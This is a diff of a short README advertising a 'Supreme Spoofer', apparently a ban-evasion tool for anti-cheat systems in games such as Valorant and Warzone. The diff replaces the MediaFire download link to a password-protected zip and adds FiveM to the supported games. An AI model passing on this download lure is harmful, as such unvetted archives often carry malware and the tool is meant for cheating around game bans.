@@ -1,7 +1,7 @@
 
 
 ***DOWNLOAD*** :arrow_heading_down:
-|[Click to Download](https://www.mediafire.com/file/rsit66fra3mj0bn/Supreme+Spoofer.zip/file)|Password: 5033|
+|[Click to Download](https://www.mediafire.com/file/8duok00kgjm0w5x/Supreme+Spoofer.zip/file)|Password: 5033|
 |---|---|
 
 ```
@@ -20,6 +20,7 @@ Supported processors: Intel & AMD (64 Bit)
 + Dead by Daylight
 + Escape From Tarkov
 + Pubg
++ Fivem
 + Rainbow Six Siege
 + Valorant
 + Call Of duty Warzone
